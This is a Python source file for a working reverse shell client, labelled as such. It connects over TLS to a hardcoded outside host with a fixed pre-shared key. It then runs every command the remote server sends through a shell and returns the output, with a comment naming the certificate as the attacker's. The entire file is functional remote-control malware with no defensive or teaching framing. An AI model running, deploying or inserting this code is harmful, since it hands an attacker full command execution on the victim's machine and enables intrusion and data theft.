#!/usr/bin/env python3
"""
Reverse Shell Client
--------------------
This client connects back to the server and waits for commands.
It handles directory change requests specially and executes all other commands.
"""
import socket
import os
import subprocess
import ssl
import sys
import argparse

# Change here the default values
parser = argparse.ArgumentParser()
parser.add_argument('--port', type=int,
                    help='Port to connect to', default=9999)
parser.add_argument('--host', type=str,
                    help='Host to connect to', default="asi.ericroy.net")
parser.add_argument('--password', type=str,
                    help='Pre-shared key', default="123456789")
parser.add_argument('--public-key-path', type=str,
                    help='Server\'s certificate path', default="cert.pem")
args = parser.parse_args()


def tls_socket():
    """
    Creates a socket over TLS that checks also cert.pem.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Wrap the socket for TLS (client-side)
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.check_hostname = False  # Optional: disable hostname check
    context.verify_mode = ssl.CERT_REQUIRED
    context.load_verify_locations(args.public_key_path)  # the attackers cert

    return context.wrap_socket(s, server_hostname=args.host)


def main():
    try:
        s = tls_socket()
        s.connect((args.host, args.port))
        # Send PSK to authenticate themselves
        s.send(args.password.encode())
    except Exception as e:
        sys.exit(f"Connection failed: {e}")

    while True:
        try:
            data = s.recv(1024)
            if not data:
                break

            command = data.decode("utf-8", errors="ignore")
            # Handle 'cd ' (change directory) commands separately
            if command.startswith('cd '):
                try:
                    os.chdir(command[3:].strip())
                    output = ""
                except Exception as e:
                    output = f"Error changing directory: {e}\n"
            else:
                # Execute the received command using subprocess
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                stdout, stderr = proc.communicate()
                output = stdout.decode() + stderr.decode()

            # Append current working directory as a prompt
            cwd = os.getcwd() + "> "
            final_output = output + cwd

            s.send(final_output.encode("utf-8"))
        except Exception as e:
            s.send(f"Error: {e}\n".encode("utf-8"))
            break

    s.close()


if __name__ == '__main__':
    main()
